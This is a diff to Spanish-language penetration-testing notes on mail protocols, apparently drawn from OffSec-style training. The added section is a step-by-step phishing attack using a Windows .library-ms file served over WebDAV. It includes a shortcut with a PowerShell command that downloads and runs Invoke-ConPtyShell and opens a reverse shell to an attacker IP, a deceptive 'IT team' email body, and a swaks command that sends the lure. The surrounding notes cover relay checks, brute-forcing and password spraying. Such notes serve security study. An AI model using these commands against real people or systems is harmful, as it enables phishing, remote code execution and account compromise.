@@ -1,4 +1,4 @@
-cp #mail #smtp #pop3 
+#mail #smtp #pop3 
 ## Interactuar con el protocolo 
 ### SMTP
 Ejemplo de envío de correo con telnet 
@@ -219,6 +219,8 @@ sudo nmap $target -p25 -Pn --script smtp-open-relay -v
 ### Envío de email con `swak`
 ```bash
 swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server $target
+# Ejemplo de offsec en el que se hardcodean las credenciales. config.Library-ms es un tipo de ataque que se ve en client-side attacks: 
+sudo swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com --attach @config.Library-ms --server $target --body @body.txt --header "Subject: Staging Script" --suppress-data --auth-user test@supermagicorg.com --auth-password 'test'
 ```
 ### POP3
 #### Enumeración de usuarios - `USER`
@@ -254,3 +256,62 @@ hydra -L users.txt -P passwords.txt imap://$target
 	```bash
 	python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
 	```
+## Ejemplo completo de phishing (offsec) vía Windows Library Files
+- Para que este tipo de ataque sea efectivo necesitamos 
+	- Un usuario válido SMTP (si tenemos las credenciales de un usuario en el AD, esa deberían servir)
+	- Correos electrónicos válidos de cuentas de usuario (supongamos que hemos recopilado `john` en `corp.com`-> Probaremos con `john@corp.com`)
+	- Servidor SMTP (puerto 25, 465 ó 587 abierto)
+- Montamos un servidor WebDAV en nuestra máquina pwnbox
+	```bash
+	wsgidav --host=0.0.0.0 --port=80 --root=$(pwd) --auth=anonymous
+	```
+- Creamos una biblioteca en la máquina Windows tipo `.library-ms`: son archivos en formato XML, y proporcionan accesos virtuales que organizan archivos desde múltiples ubicaciones en una sola vista. Creamos un archivo llamado `config.library-ms`:
+	```xml
+	<?xml version="1.0" encoding="UTF-8"?>
+	<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+	<name>@windows.storage.dll,-34582</name>
+	<version>6</version>
+	<isLibraryPinned>true</isLibraryPinned>
+	<iconReference>imageres.dll,-1003</iconReference>
+	<templateInfo>
+	<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+	</templateInfo>
+	<searchConnectorDescriptionList>
+	<searchConnectorDescription>
+	<isDefaultSaveLocation>true</isDefaultSaveLocation>
+	<isSupported>false</isSupported>
+	<simpleLocation>
+	<url>http://192.168.45.244</url>
+	</simpleLocation>
+	</searchConnectorDescription>
+	</searchConnectorDescriptionList>
+	</libraryDescription>
+	```
+	Una vez creado clicamos en él para que se serialice información del archivo  
+  
+- Creamos ahora un `Shortcut` (`Botón derecho > new > shotcut`) con el nombre `automatic_configuration.lnk` y el siguiente contenido:
+	```powershell
+	powershell.exe -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.244:8000/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell 192.168.45.244 4444"
+	```
+- Nos aseguramos que en nuestro servidor WebDAV esté la siguiente información: 
+	- `Body`: Cuerpo del mensaje (ej):
+		```textplain
+		Hello! My name is Dwight, and I'm a new member of the IT Team.
+		
+		This week I am completing some configurations we rolled out last week.
+		To make this easier, I've attached a file that will automatically
+		perform each step. Could you download the attachment, open the
+		directory, and double-click "automatic_configuration"? Once you
+		confirm the configuration in the window that appears, you're all done!
+		
+		If you have any questions, or run into any problems, please let me
+		know!%
+		``` 
+	- `automatic_configuration.lnk`: Lo podemos mover desde la máquina windows al propio servidor WebDAV
+	- `config.Library-ms`:  Lo podemos mover desde la máquina windows al propio servidor WebDAV (Puede parecer que metemos un archivo dentro de sí mismo, porque tras clicar en `config.Library-ms` abrimos el WebDAV, y lo que hacemos es copiar este archivo dentro de la carpeta)
+	- `Invoke-ConPtyShell.ps1`: Lo copiamos desde nuestra kali para el ataque
+- Supongamos que `$target` es el servidor SMTP, que tenemos un correo al que envíar información (`dave.wizard@supermagicorg.com`) y credenciales válidas para el usuario `test`, que tiene correo  `test@supermagicorg.com` y password `test`
+	```bash
+	 sudo swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com --attach @config.Library-ms --server $target --body @body.txt --header "Subject: Staging Script" --suppress-data --auth-user test@supermagicorg.com --auth-password 'test'
+	```
+- Tras ponernos en escucha en nuestra pwnbox deberíamos recibir una revshell si el usuario pincha en el correo
